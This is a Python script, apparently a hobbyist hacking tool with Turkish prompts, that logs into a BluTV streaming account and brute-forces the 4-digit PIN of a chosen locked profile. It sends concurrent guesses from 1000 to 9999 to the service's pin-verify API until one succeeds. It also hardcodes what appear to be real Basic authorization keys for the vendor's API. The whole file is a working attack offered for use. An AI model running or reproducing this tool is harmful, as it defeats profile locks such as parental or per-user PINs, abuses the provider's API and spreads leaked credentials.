import os,time, concurrent.futures, threading

try:
  import requests
except ModuleNotFoundError:
    print("Modul Eksik")
    print("Yukleniyor...")
    os.system("pip install requests")
    print("Yukleme Tamamlandı! Yeniden Acin")
    time.sleep(1.5)
    exit(0)

print("""                                                  
                                                          
                          :     ..     :                  
                   .      -.    --    .-      .           
                    :.    .=.   ==   .=.    .:            
                     --.   ==. .==. .==   .--             
              .:.     -=-  -==.:==:.==-  -=-     .:.      
                .--:   -==::===-==-===::==-   :--.        
                  .-=-:.-================-.:-=-.          
           .::..    :========================:    ..::.   
              .:-==---======================---==-:.      
                  :-==========================-:          
          .:::::::---========================---:::::::.  
             ...::--==========================--::...     
                 .:-==========================-:.         
            .:-====--========================--====-:.    
          ..       .-========================-.       ..  
                 :===-:====================:-===:         
              .--:.  .-==-==============-==-.  .:--.      
            ..      :==-.:===-======-===:.-==:      ..    
                   --:   ==- :==::==: -==   :--           
                 .:.    -=:  :=-  -=:  :=-    .:.         
                       .=.   :=.  .=:   .=.               
                       -     --    --     -               
                      .      -      -      .              
                             .      .                     
                         
""")
print("                          Coded by Reco\n")


mail = input("Mail->")
passw = input("Şifre->")


def login():
    uri = "https://www.blutv.com/api/login"
    data = {"remember":"false","username":f"{mail}","password":f"{passw}","captchaVersion":"v3","captchaToken":""}
    head = {
        "Host":"www.blutv.com",
        "Connection":"keep-alive",
        "AppPlatform":"com.blu",
        "Content-Type":"text/plain;charset=UTF-8",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "AppCountry":"TUR",
        "AppLanguage":"tr-TR",
        "Accept":"*/*",
        "Origin":"https://www.blutv.com",
        "Sec-Fetch-Site":"same-origin",
        "Sec-Fetch-Mode":"cors",
        "Sec-Fetch-Dest":"empty",
        "Referer":"https://www.blutv.com/giris",
        "Accept-Language":"tr-TR,tr;q=0.9",
        "Accept-Encoding":"gzip, deflate",
    }

    r = requests.post(url=uri, json=data, headers=head)

    try:
        return r.cookies.get("token_a")
    except:
        return None


def get_profiles(token):
    headers = {
        'Host': 'adapter.blupoint.io',
        'Authorizationtoken': 'Bearer '+token,
        'Authorization': 'Basic 5e1f164cab95a20030e97a47:xqBlMqQPx3Phw8N8FToiiXNt04B2SXTS',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Appauthorization': 'Basic 54b03846058d0220945530b4:hyoGZ78iYfvx+KpB2oNcAq05oOJlTQmtWRdCVPuVmxJDeiOCrJ3eVS7+JUpRPJGLKJbAOAzlB4v+a5HRL22v2Q==',
        'Origin': 'https://smarttv.blutv.com.tr',
        'Referer': 'https://smarttv.blutv.com.tr/',
    }
    response = requests.get("https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/smarttv/get-profiles", headers=headers).json()
    responseAry = response["profiles"]

    ids = []

    for i,profile in enumerate(responseAry):
        if profile["has_pin"]:
            _id = profile["_id"]
            name = profile["name"]
            ids.append(_id)
            print(f"{i+1}> {name}")
    selected = int(input("Select Profile->")) - 1
    global selected_id
    selected_id = ids[selected]


def check_pin(number, stop_event, token):
    headers = {
        'Host': 'adapter.blupoint.io',
        'Authorizationtoken': 'Bearer '+token,
        'Authorization': 'Basic 5e1f164cab95a20030e97a47:xqBlMqQPx3Phw8N8FToiiXNt04B2SXTS',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Appauthorization': 'Basic 54b03846058d0220945530b4:hyoGZ78iYfvx+KpB2oNcAq05oOJlTQmtWRdCVPuVmxJDeiOCrJ3eVS7+JUpRPJGLKJbAOAzlB4v+a5HRL22v2Q==',
        'Origin': 'https://smarttv.blutv.com.tr',
        'Referer': 'https://smarttv.blutv.com.tr/',
        'Content-Length': '14',
        'Content-Type': 'application/json;charset=UTF-8'
    }

    while not stop_event.is_set():
        response = requests.post("https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/smarttv/profile-pin-verify?profileId=" + selected_id,json={"pin": f"{number}"}, headers=headers).text
        if "errors.invalidPinError" in response:
            return False
        elif '{"verified":true,"_status":200,"_status_text":"OK"}' in response:
            print("\nPin:", number)
            stop_event.set()
            return True
        else:
            return None
     
def main():
    token = login()
    if token is None:
        print("Bad Account")
        return
    get_profiles(token)
    attempt_counter = 0
    stop_event = threading.Event()
    thread_bots = int(input("Bots->"))

    

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_bots) as executor:
        pin_numbers = range(1000, 10000)
        response = {executor.submit(check_pin, number, stop_event, token): number for number in pin_numbers}

        for future in concurrent.futures.as_completed(response):
            result = future.result()
            if result:
                stop_event.set()
                break
            else:
                attempt_counter += 1
                print(f"\rAttempts: {attempt_counter} / 9999", end='', flush=True)

            

if __name__ == "__main__":
    main()